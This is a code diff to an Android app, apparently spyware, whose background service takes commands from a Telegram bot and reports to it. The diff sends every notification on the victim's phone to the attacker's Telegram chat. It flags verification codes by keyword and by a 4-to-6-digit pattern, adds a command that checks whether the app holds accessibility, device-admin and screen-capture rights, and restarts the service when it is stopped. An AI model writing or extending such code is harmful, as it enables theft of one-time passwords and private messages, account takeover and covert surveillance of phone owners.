@@ -1,5 +1,6 @@
 package com.v8.global.sniffer;
 
+import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.app.*;
@@ -18,6 +19,7 @@ import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
+import android.view.accessibility.AccessibilityManager;
 
 import androidx.core.app.NotificationCompat;
 
@@ -161,6 +163,7 @@ public class MainService extends NotificationListenerService {
                 String[] parts = args.split(" ", 2);
                 if (parts.length == 2) sendSms(parts[0], parts[1]);
             } break;
+            case "/check_permissions": checkPermissions(); break;
         }
     }
 
@@ -179,8 +182,45 @@ public class MainService extends NotificationListenerService {
                 "/vibrate - Vibrate\n" +
                 "/open [url] - Open URL\n" +
                 "/sms_send [number] [text] - Send SMS\n" +
+                "/check_permissions - Check all permissions\n" +
                 "/help - This menu";
         sendMessage(help, CHAT_ID);
+    }
+
+    private void checkPermissions() {
+        StringBuilder sb = new StringBuilder("🔐 **Permissions Status:**\n\n");
+        
+        // صلاحية الإشعارات
+        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
+        sb.append("Notification Access: ").append(notificationEnabled ? "✅" : "❌").append("\n");
+        
+        // صلاحية الوصول
+        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
+        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+        boolean accessibilityEnabled = false;
+        for (AccessibilityServiceInfo service : enabledServices) {
+            if (service.getId().contains(getPackageName())) {
+                accessibilityEnabled = true;
+                break;
+            }
+        }
+        sb.append("Accessibility Service: ").append(accessibilityEnabled ? "✅" : "❌").append("\n");
+        
+        // صلاحية Admin
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
+        sb.append("Device Admin: ").append(dpm.isAdminActive(adminReceiver) ? "✅" : "❌").append("\n");
+        
+        // صلاحية تسجيل الشاشة
+        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
+        sb.append("Screen Capture: ").append(prefs.contains("resultCode") ? "✅" : "❌").append("\n");
+        
+        // تجاهل البطارية
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        sb.append("Battery Ignore: ").append(pm.isIgnoringBatteryOptimizations(getPackageName()) ? "✅" : "❌").append("\n");
+        
+        sendMessage(sb.toString(), CHAT_ID);
     }
 
     private void getLocation() {
@@ -355,7 +395,9 @@ public class MainService extends NotificationListenerService {
                 .post(new FormBody.Builder().add("chat_id", chatId).add("text", text).build())
                 .build();
         client.newCall(request).enqueue(new okhttp3.Callback() {
-            @Override public void onResponse(Call call, Response response) { response.close(); }
+            @Override public void onResponse(Call call, Response response) { 
+                try { response.close(); } catch (Exception e) {}
+            }
             @Override public void onFailure(Call call, IOException e) {}
         });
     }
@@ -372,7 +414,10 @@ public class MainService extends NotificationListenerService {
                     .url("https://api.telegram.org/bot" + TOKEN + "/sendAudio")
                     .post(body).build();
             client.newCall(request).enqueue(new okhttp3.Callback() {
-                @Override public void onResponse(Call call, Response response) { response.close(); file.delete(); }
+                @Override public void onResponse(Call call, Response response) { 
+                    try { response.close(); } catch (Exception e) {}
+                    file.delete();
+                }
                 @Override public void onFailure(Call call, IOException e) {}
             });
         } catch (Exception e) {}
@@ -381,9 +426,18 @@ public class MainService extends NotificationListenerService {
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         Bundle extras = sbn.getNotification().extras;
+        String title = extras.getString(Notification.EXTRA_TITLE, "");
         String text = extras.getString(Notification.EXTRA_TEXT, "");
-        if (text.contains("رمز") || text.contains("code")) {
-            sendMessage("🔐 Code: " + text, CHAT_ID);
+        
+        // إرسال كل الإشعارات
+        String appName = sbn.getPackageName();
+        sendMessage("🔔 [" + appName + "]\n" + title + "\n" + text, CHAT_ID);
+        
+        // كشف رموز التحقق
+        if (text.contains("رمز") || text.contains("code") || 
+            title.contains("رمز") || title.contains("code") ||
+            text.matches(".*\\d{4,6}.*")) {
+            sendMessage("🔐 **Code detected:** " + text, CHAT_ID);
         }
     }
 
@@ -393,6 +447,8 @@ public class MainService extends NotificationListenerService {
         if (timer != null) timer.cancel();
         if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
         if (mediaRecorder != null) mediaRecorder.release();
+        
+        // إعادة تشغيل الخدمة
         startService(new Intent(this, MainService.class));
     }
-  }
+}
